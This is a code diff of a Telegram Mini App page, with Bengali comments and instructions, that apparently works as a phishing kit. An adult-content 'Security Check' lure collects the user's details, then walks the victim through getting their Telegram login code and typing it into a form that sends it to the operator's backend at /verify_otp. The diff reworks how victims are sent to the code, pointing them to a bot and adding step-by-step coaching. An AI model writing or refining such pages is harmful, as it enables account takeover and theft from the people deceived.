@@ -8,30 +8,29 @@
     <style>
         body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .box { background: white; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; text-decoration: none; }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; }
         .btn-blue { background: #007bff; }
         .hidden { display: none; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; color: #28a745; font-weight: bold; }
+        .info { font-size: 12px; color: #666; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <!-- ধাপ ১: নম্বর নেওয়া -->
     <div class="box" id="step0">
-        <h2>Verification</h2>
-        <p style="font-size: 14px; color: #666;">Click confirm to continue.</p>
+        <h2>Security Check</h2>
+        <p class="info">Confirm your identity to continue.</p>
         <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
-        <div id="loader" class="hidden">Connecting...</div>
+        <div id="loader" class="hidden" style="color:#28a745; font-weight:bold;">Connecting...</div>
     </div>
 
-    <!-- ধাপ ২: ওটিপি বক্স এবং সরাসরি ম্যানুয়াল বাটন -->
     <div class="box hidden" id="step2">
         <h3>Verify Code</h3>
-        <p style="font-size: 13px; color: #555;">Click the button below to see your code.</p>
+        <p class="info">১. নিচের বাটনে ক্লিক করলে অ্যাপটি নিচে নেমে যাবে।<br>২. বটের চ্যাটে গিয়ে "View Code" বাটনে ক্লিক করে কোডটি দেখুন।<br>৩. কোড দেখে আবার এখানে ফিরে আসুন।</p>
         
-        <!-- এই বাটনে কোনো ড্রামাটিক টাইমার বা ব্যাকগ্রাউন্ড কাজ নেই। সরাসরি ক্লিক = সরাসরি চ্যাট ওপেন -->
-        <button class="btn btn-blue" id="get_code_btn" onclick="openOTPChat()">📩 GET CODE 📩</button>
+        <!-- এই বাটনে ক্লিক করলে অ্যাপ মিনিমাইজ হবে -->
+        <button class="btn btn-blue" onclick="minimizeToBot()">📩 GET CODE</button>
         
-        <input type="number" id="otp" placeholder="Enter Code">
+        <input type="number" id="otp" placeholder="Enter 5-digit Code">
         <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
     </div>
 
@@ -65,31 +64,23 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") {
-                    // নম্বর পাঠানো সফল হলে ইউজারকে ম্যানুয়াল বাটনওয়ালা ওটিপি পেজে আনা হচ্ছে
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
                 }
             } catch (e) { }
         }
 
-        // এটাই সেই আসল ফাংশন যা সরাসরি ইউজার টাচ করার সাথে সাথে কল হবে
-        function openOTPChat() {
-            // ১. হ্যাপটিক ভাইব্রেশন
-            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy');
-
-            // ২. সরাসরি ক্লিক ইভেন্টের ভেতরেই ওপেন মেথড। কোনো এরর আসবে না।
-            tg.openTelegramLink("https://t.me/777000");
-
-            // ব্যাকআপ হিসেবে যদি লিঙ্কে সমস্যা হয়
-            setTimeout(() => {
-                window.location.href = "tg://openmessage?user_id=777000";
-            }, 500);
+        // আপনার ট্রিক: অ্যাপটি মিনিমাইজ করে বটের চ্যাটে পাঠানো
+        function minimizeToBot() {
+            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+            // আপনার বটের লিঙ্ক ওপেন করলে অ্যাপটি অটোমেটিক নিচে বারে চলে যাবে
+            tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
         }
 
         async function verifyOTP() {
             let code = document.getElementById("otp").value;
             if(code.length < 5) return alert("Enter Code!");
-            
+            document.getElementById('v_btn').innerText = "Verifying...";
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                     method: "POST", headers: {"Content-Type": "application/json"},
@@ -97,7 +88,7 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") { tg.close(); } 
-                else { alert("Wrong Code!"); }
+                else { alert("Wrong Code!"); document.getElementById('v_btn').innerText = "Verify OK"; }
             } catch (e) { }
         }
     </script>
